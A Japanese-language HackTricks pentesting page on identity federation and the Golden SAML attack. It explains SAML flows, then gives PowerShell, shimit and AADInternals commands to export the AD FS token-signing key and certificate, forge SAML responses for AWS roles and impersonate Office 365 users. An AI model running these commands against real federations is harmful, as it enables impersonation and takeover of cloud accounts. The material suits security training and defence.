# フェデレーション

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[Telegramグループ](https://t.me/peass)に参加するか、**Twitter**で**@hacktricks_live**をフォローする
- **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出する

</details>

## 基本情報

[ドキュメントから：](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**フェデレーション**は**信頼関係**を確立した**ドメイン**の集合です。信頼レベルは異なる場合がありますが、通常は**認証**を含み、ほぼ常に**承認**を含みます。典型的なフェデレーションには、**共有アクセス**のために**信頼関係**を確立した**複数の組織**が含まれる場合があります。

オンプレミス環境をAzure ADと**フェデレーション**し、このフェデレーションを認証および承認に使用できます。このサインイン方法により、すべてのユーザーの**認証がオンプレミスで発生**することが保証されます。この方法により、管理者はより厳格なアクセス制御レベルを実装できます。**AD FS**およびPingFederateとのフェデレーションが利用可能です。

<figure><img src="../../../../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure>

基本的に、フェデレーションでは、すべての**認証**が**オンプレミス**環境で発生し、ユーザーは信頼されたすべての環境でSSOを体験します。したがって、ユーザーは**オンプレミスの資格情報**を使用して**クラウド**アプリケーションにアクセスできます。

**セキュリティアサーションマークアップ言語（SAML）**は、プロバイダ間でのすべての認証および承認**情報の交換**に使用されます。

フェデレーションのセットアップでは、次の3つの当事者があります：

- ユーザーまたはクライアント
- Identity Provider（IdP）
- Service Provider（SP）

（画像は https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps から）

<figure><img src="../../../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

1. 最初に、ユーザーがアプリケーション（Service ProviderまたはSP、例：AWSコンソールまたはvSphere Web Client）にアクセスします。特定の実装によっては、このステップをバイパスして、クライアントを直接IdP（Identity Provider）にリダイレクトすることがあります。
2. 次に、SPはユーザー認証のために適切なIdP（例：AD FS、Okta）を特定します。その後、SPはSAML（Security Assertion Markup Language）AuthnRequestを作成し、クライアントを選択したIdPにリダイレクトします。
3. IdPが引き継ぎ、ユーザーを認証します。認証後、IdPによってSAMLResponseが作成され、ユーザーを介してSPに転送されます。
4. 最後に、SPはSAMLResponseを評価します。IdPとの信頼関係が確認された場合、ユーザーにアクセスが許可されます。これにより、ログインプロセスが完了し、ユーザーがサービスを利用できるようになります。

**SAML認証と一般的な攻撃について詳しく学びたい場合は、以下を参照してください：**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## ピボット

- AD FSはクレームベースのアイデンティティモデルです。
- "..クレームは、ユーザーについて作成された（たとえば、名前、アイデンティティ、グループなどの）ステートメントであり、主にインターネット上のどこにでもあるクレームベースのアプリケーションへのアクセスを承認するために使用されます。"
- ユーザーのクレームはSAMLトークン内に記述され、IdPによって機密性を提供するために署名されます。
- ユーザーはImmutableIDによって識別されます。これはグローバルに一意であり、Azure ADに格納されています。
- ImmutableIDは、ユーザーのGUIDから派生させることができ、Azure ADに格納されています。
- 詳細は[https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)で確認できます。

**Golden SAML攻撃：**

- ADFSでは、SAMLレスポンスはトークン署名証明書によって署名されます。
- 証明書が侵害されると、Azure ADに同期されている**任意のユーザー**として認証できる可能性があります！
- PTAの悪用と同様に、ユーザーのパスワード変更やMFAは影響を与えません。なぜなら、認証応答を偽造しているからです。
- 証明書は、DA権限を持つAD FSサーバーから抽出し、その後、インターネットに接続された任意のマシンから使用できます。
- 詳細は[https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)で確認できます。

### Golden SAML

**Identity Provider（IdP）**が**SAMLResponse**を生成してユーザーサインインを承認するプロセスが重要です。IdPの特定の実装によっては、**レスポンス**がIdPのプライベートキーを使用して**署名**または**暗号化**される場合があります。この手順により、Service Provider（SP）はSAMLResponseの信頼性を確認し、それが信頼されたIdPによって発行されたことを確認します。

これは、[ゴールデンチケット攻撃](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)と類似しており、ユーザーのアイデンティティと権限を認証するキー（ゴールデンチケットのKRBTGT、ゴールデンSAMLのトークン署名プライベートキー）を操作して、認証オブジェクト（TGTまたはSAMLResponse）を偽造できます。これにより、任意のユーザーをなりすまし、SPへの不正アクセスを許可できます。

Golden SAMLには次の利点があります：

- **リモートで作成**できます。対象のドメインやフェデレーションに属する必要はありません。
- **二要素認証（2FA）**が有効でも有効です。
- トークン署名**プライベートキーは自動的に更新されません**。
- ユーザーのパスワードの変更は、すでに生成されたSAMLを**無効にしません**。

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services（AD FS）](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\))は、信頼できるビジネスパートナー間でアイデンティティ情報を**安全に交換**するためのMicrosoftサービスです（フェデレーション）。これにより、ドメインサービスがフェデレーション内の他のサービスプロバイダとユーザーのアイデンティティを共有できます。

AWSが（フェデレーション内の）侵害されたドメインを信頼している場合、この脆弱性を利用して、AWS環境で**任意の権限を取得**する可能性があります。攻撃には、SAMLオブジェクトに署名するために使用される**プライベートキー**が必要であり、これはゴールデンチケット攻撃でのKRBTGTと同様です。このプライベートキーを取得するには、AD FSユーザーアカウントへのアクセスが必要です。

Golden SAML攻撃を実行するための要件は次のとおりです：

- **トークン署名プライベートキー**
- **IdP公開証明書**
- **IdP名**
- **ロール名（アサインするロール）**
- ドメイン\ユーザー名
- AWSでのロールセッション名
- AmazonアカウントID

_太字の項目のみが必須です。他の項目は必要に応じて入力できます。_

**プライベートキー**を取得するには、**AD FSユーザーアカウント**へのアクセスが必要です。そこから、[mimikatz](https://github.com/gentilkiwi/mimikatz)などのツールを使用して、プライベートキーを**パーソナルストアからエクスポート**できます。他に必要な情報を収集するには、Microsoft.Adfs.Powershellスナップインを使用し、ADFSユーザーとしてログインしていることを確認します。
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
すべての情報を持っていると、[**shimit**](https://github.com/cyberark/shimit)**を使用してなりすまししたいユーザーの有効なSAMLResponseを忘れる可能性があります:**
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

### オンプレミス -> クラウド
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
ImmutableIDを作成し、クラウド専用ユーザーを偽装することも可能です。
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## 参考

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じてゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live) をフォローする。
* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>
